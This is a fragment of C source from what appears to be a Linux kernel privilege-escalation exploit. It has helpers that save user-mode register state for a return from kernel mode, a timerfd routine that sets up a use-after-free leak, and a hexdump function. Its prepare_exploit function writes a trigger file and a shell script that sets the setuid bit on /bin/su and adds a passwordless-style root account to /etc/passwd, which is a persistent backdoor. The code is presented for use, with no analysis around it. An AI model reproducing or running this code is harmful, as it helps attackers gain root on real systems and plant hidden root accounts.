unsigned long usr_cs, usr_ss, usr_rflags;

static void save_state()
{
	__asm__ __volatile__(
	"movq %0, cs;"
	"movq %1, ss;"
	"pushfq;"
	"popq %2;"
	: "=r" (usr_cs), "=r" (usr_ss), "=r" (usr_rflags) : : "memory" );
}


static void do_nothing(void)
{
	return;
}


int create_timer(int leak)
{

	struct itimerspec its;

	its.it_interval.tv_sec = 0;
	its.it_interval.tv_nsec = 0;
	its.it_value.tv_sec = 10;
	its.it_value.tv_nsec = 0;

	int tfd = timerfd_create(CLOCK_REALTIME, 0);
	timerfd_settime(tfd, 0, &its, 0);

	if (leak)
	{
		close(tfd);
		sleep(1);
		return 0;
	}

}


void hexdump(unsigned char *buff, unsigned long size)
{
    int i,j;

    for (i = 0; i < size/8; i++)
    {
      if ((i % 2) == 0)
      {
          if (i != 0)
              printf("  \n");

          printf("  %04x  ", i*8);
      }

      unsigned long ptr = ((unsigned long *)(buff))[i];
      printf("0x%016lx", ptr);
      printf("    ");

    }
    printf("\n");
}


void prepare_exploit()
{
	system("echo -e '\xdd\xdd\xdd\xdd\xdd\xdd' > /home/user/asd");
	system("chmod +x /home/user/asd");
	system("echo '#!/bin/sh' > /home/user/x");
	system("echo 'chmod +s /bin/su' >> /home/user/x");
	system("echo 'echo \"asd:12prjwbMKCxIE:0:0:asd:/root:/bin/sh\" >> /etc/passwd' >> /home/user/x");
	system("chmod +x /home/user/x");
}
